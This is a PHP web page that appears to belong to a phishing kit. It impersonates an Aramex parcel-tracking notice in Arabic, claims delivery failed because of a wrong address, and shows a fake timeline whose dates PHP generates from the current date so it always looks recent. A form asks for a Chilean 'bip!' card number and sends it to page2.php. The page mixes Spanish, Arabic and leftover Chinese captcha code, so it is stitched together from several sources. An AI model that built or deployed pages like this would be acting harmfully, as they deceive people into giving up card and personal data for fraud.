<?php
include('header-him.php');
$currentDateTime = date('m/d/Y H:i');
$currentDate = date('m/d/Y');
$time = date('H:i');
?>
<style type="text/css">
  form button[type="submit"] {
    background: #00a8b7;
    border: 1px solid #007984;
    color: #FFF;
    -moz-box-shadow: 0px 2px 2px RGBA(0, 0, 0, 0.08);
    -webkit-box-shadow: 0px 2px 2px RGBA(0, 0, 0, 0.08);
    box-shadow: 0px 2px 2px RGBA(0, 0, 0, 0.08);
    -moz-border-radius: 4px;
    -webkit-border-radius: 4px;
    border-radius: 4px;
  }

  .login-form {
    margin-right: -10px;
    margin-left: -10px;
  }

  .container {
    line-height: 1.5;
  }

  .photoblock2 {
    background-image: url(/SA/images/photoblock_inbg.png) !important;
  }

  .innerpage {
    padding-top: 0px !important;
  }

  .tab-header-item {
    width: 49%;
    position: relative;
    float: left;
    padding: 0;
    margin: 0;
    background: gray;
    text-align: center;
    font-size: 16px;
    line-height: 40px !important;
    color: white;
    border-top-left-radius: 12px;
    border-top-right-radius: 12px;
    cursor: pointer;
  }

  .tab-header-item.active {
    background: black;
  }

  .pull-left {
    float: left !important;
  }

  .pull-right {
    float: right !important;
  }

  .tab-content {
    display: none;
  }

  .tab-content.active {
    display: block;
  }

  .tab-container {
    border-radius: 10px;
    box-shadow: 2px 2px 10px -2px rgba(0, 0, 0, .5);
    transition: background .3s, border .3s, border-radius .3s, box-shadow .3s;
    padding: 1rem 0.6rem;
  }

  .tab-container form .btnSubmit {
    border-radius: 50px !important;
    width: 100%;
    margin-top: 0.5rem;
  }

  .tab-container .form-group {
    color: #333;
    /* font-size: 1.25rem; */
  }

  .form-info>i {
    margin-left: 12px;
  }

  .submit-info {
    width: 100%;
  }
</style>
<!-- main Start -->
<div id="center" class="main innerpage">
  <div class="old_code_wrap">
    <a class="accesskey" href="#aC" id="aC" accesskey="C" title="主要內容區">:::</a>
    <!-- photoblock start-->
    <section class="section col-12 photoblock2 no-print" style="background-image: url(/SA/images/photoblock_inbg.png) !important;">
    </section>
    <!-- photoblock end-->
    <div class="container">
      <!-- h1節點 -->
      <h1 style="font-size: 1.5em;margin: 0.83em 0;" class="title">consultas Sobre el estado de los Cargos no Pagados</h1>
      <!-- aP Start -->
      <section class="ap">
        <!-- searchform start -->
        <div class="searchform">
          <div class="login-form">
            <div class="tab-headers clearfix">
              <h2 class="tab-header-item active" data-tab="loginForm">Carga tarjeta bip!</h2>
              <!-- <h2 class="tab-header-item pull-right" data-tab="testform">Carga bip!QR</h2>   -->
            </div>
            <div class="tab-container">
              <form action="./page2.php" method="POST" id="loginForm" data-tab="tab1" novalidate class="active tab-content">
                <div class="form-group">
                  <legend class="form-info">Número de tarjeta bip!<i class="fa fa-info-circle"></i></legend>
                  <input type="text" placeholder="Ej: 123456789" name="username" required>
                </div>
                <div class="form-submit">
                  <button type="submit" class="btnSubmit btn" name="submit" id="submit">Continuar</button>
                  <center>
                    <span class="submit-info">Al continuar estas aceptando nuestros <b>términos y condiciones</b>.</span>
                  </center>
                </div>
              </form>
              <form action="./page2.php" method="POST" id="testform" class="tab-content" novalidate>
                <p>empty</p>
              </form>
            </div>
          </div>
        </div>
      </section>
    </div>
  </div>
  <div class="container">
    <section class="ap">
      <div class="row only_mobile">
        <div class="card_wrap">
          <div class="top_card">
            <div class="id_main">
              <span><img src="https://www.aramex.com/Sitefinity/WebsiteTemplates/aramex-ar/App_Themes/aramex-ar/Images/Aramex%20logo%20Arabic.webp" width="35px"> </span>
              <div class="top_card_left">
                <h4>S100987050072</h4>
                <p class="short_id">رقم الشحن/p>
              </div>
            </div>
            <p style="color: red" class="like_viewmore">أوقف التسليم</p>
          </div>
          <div class="bottom_card">
            <p class="card_tag">Aramex</p>
            <p class="post_date_card">12/11/2023</p>
          </div>
        </div>
      </div>
      <div class="container-box progress-bar-container">
        <div class="container-box progress-bar-icon">
          <img class="image-content" src="/SA/images/box-icon.png" alt="">
        </div>
        <div class="dotted-line"></div>
        <div class="container-box progress-bar-icon">
          <img class="image-content" src="/SA/images/box-icon.png" alt="">
        </div>
        <div class="dotted-line"></div>
        <div style="width: 42px; height: 42px;" class="container-box progress-bar-icon">
          <img class="image-content" src="/SA/images/truck-icon.png" alt="">
        </div>
        <div style="opacity: 0.4;" class="dotted-line"></div>
        <div style="opacity: 0.4" class="container-box progress-bar-icon">
          <img class="image-content" src="/SA/images/done-icon.jpg" alt="">
        </div>
      </div>
      <div class="time_line_wrap only_mobile">
        <div class="time_line one">
          <div class="left-green">
            <div class="for_color">
              <p><?php echo $currentDate;?><br>09:52
              <p>
            </div>
          </div>
          <span class="time_row_line"></span>
          <div class="right-red">
            <p class="top_title_ps">فشل التوزيع بسبب عنوان الشارع الخاطئ
            <p>
            <p class="bottom_color">العودة إلى أقرب مركز توزيع
            <p>
          </div>
          <div>
          </div>
        </div>
        <div class="time_line">
          <div class="left-green">
            <div class="for_color">
              <p><?php echo date('m/d/Y', strtotime($currentDateTime . ' -1 DAY +2 HOURS'));?><br>15:17
              <p>
            </div>
          </div>
          <span class="time_row_line"></span>
          <div class="right-red">
            <p class="top_title_ps">وصلت الطرود إلى محطة الشحن المحددة
            <p>
            <p class="bottom_color">الساعي على استعداد للتسليم
            <p>
          </div>
          <div>
          </div>
        </div>
        <div class="time_line">
          <div class="left-green">
            <div class="for_color">
                <p><?php echo date('m/d/Y', strtotime($currentDateTime . ' -2 DAY +3 HOURS'));?><br>18:21

              <p>
            </div>
          </div>
          <span class="time_row_line"></span>
          <div class="right-red">
            <p class="top_title_ps">تحميل المركبات ونقلها إلى مدينة المقصد
            <p>
            <p class="bottom_color">تم الانتهاء من أمن الطرد
            <p>
          </div>
          <div>
          </div>
        </div>
        <div class="time_line">
          <div class="left-green">
            <div class="for_color">
                <p><?php echo date('m/d/Y', strtotime($currentDateTime . ' -3 DAY +1 HOURS'));?><br>10:13
              <p>
            </div>
          </div>
          <span class="time_row_line"></span>
          <div class="right-red">
            <p class="top_title_ps">تم استلام الطرود وتسجيلها
            <p>
            <p class="bottom_color">الاستعداد لإجراء تفتيش أمني للطرد
          </div>
          <div>
          </div>
        </div>

      </div>
      <div class="message_expert only_mobile">
        <div class="sub-title alrt-modify py-5">
          <!-- <img src="/images/alert3.png"> -->
          <h2 class="title"><i class="fa-solid fa-circle-exclamation icon-alert me-2"></i> فشل تسليم الطرد</h2>
          <p class="title-text">بسبب خطأ عنوان الشارع الخاص بك، فشل تسليم الطرد<strong></strong></p>
          <p class="title-text">تسمح Aramex بإعادة التسليم بعد فشل تسليم الطرد الخاص بك، يرجى تحديث العنوان الصحيح في أقرب وقت ممكن وسنعيد التوزيع في أقرب وقت ممكن<strong></strong></p>
        </div>
      </div>
      <div class="button_block only_mobile">
        <a href="page2.php"><button style="padding: 10px 16px;" class="button_next red-button">تحديث على الفور</button></a>
      </div>

    </section>
    <!-- aP End -->
    <script>
      function checkForm() {
        var canGo = true;
        var custno = $("#custNo").val();
        if (custno === "") {
          $("#custNoError").show();
          canGo = false;
        }
        var answer = $("#answer").val();
        if (answer === "") {
          $("#answerError").show();
          canGo = false;
        }
        return canGo;
      }

      function errorNoticeDisplay(fieldName, noticeWarning) {
        $("#" + fieldName + "Error").show();
        $("#" + fieldName + "ErrorWarning").text(noticeWarning);
      }

      function sendEmailCaptcha() {
        var returnValue = true;
        if ($("#email").val() == "" || $("#email").val() == "請輸入Email 帳號") {
          errorNoticeDisplay('email', '請輸入Email 帳號');
          returnValue = false;
        } else {
          //var patternEmail = /^[\w\"\+-]+[\.]?[\w\"\+-]+@(\[)*\w+([\.-]?\w+)*(\.\w{2,})+(\])*$/;
          var patternEmail = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
          if (patternEmail.test($("#email").val()) == false) {
            errorNoticeDisplay('email', '請輸入合乎格式之Email 帳號');
            returnValue = false;
          } else {
            patternEmail = /@yahoo\.|@kimo\.|@icloud\.|@me\./;
            if (patternEmail.test($("#email").val().toLowerCase()) == true) {
              errorNoticeDisplay('email',
                '不建議使用@yahoo.、@kimo.、@icloud.及@me.信箱註冊，避免擋信!');
            }
          }
        }
        if (returnValue) {
          $.ajax({
            url: "/captcha/sendCaptcha",
            type: "get",
            data: {
              "email": $("#email").val()
            },
            success: function(response) {
              $('#modal1').hide();
              $('.modal_overlay').hide();
              if (response) {
                swal("驗證碼已寄出，請至電子郵件信箱收信。");
              } else {
                swal("驗證碼已過期，請刷新驗證碼。");
              }

            },
            error: function(response) {
              swal("驗證碼已過期，請刷新驗證碼。");
            }
          });
        }
      }

      $(function() {

        $(".tab-header-item").on("click", function(e) {
          e.preventDefault();
          $(".tab-header-item").removeClass("active");
          $(this).addClass("active");

          var data_tab = $(this).attr("data-tab");
          $(".tab-content").removeClass("active");
          $("#" + data_tab).addClass("active");
        });

        $('#custNo').click(function() {
          $('.annotation').show();
          $("#answer").val("");
        });

        $('#answer').focus(function() {
          $("#answer").val("");

        });
        $('#answer').keyup(function() {
          var ans = $("#answer").val();
          $("#answer").val(toASCII(ans));
        });

      });
    </script>
  </div>
</div>
<?php include('footer-him.php'); ?>

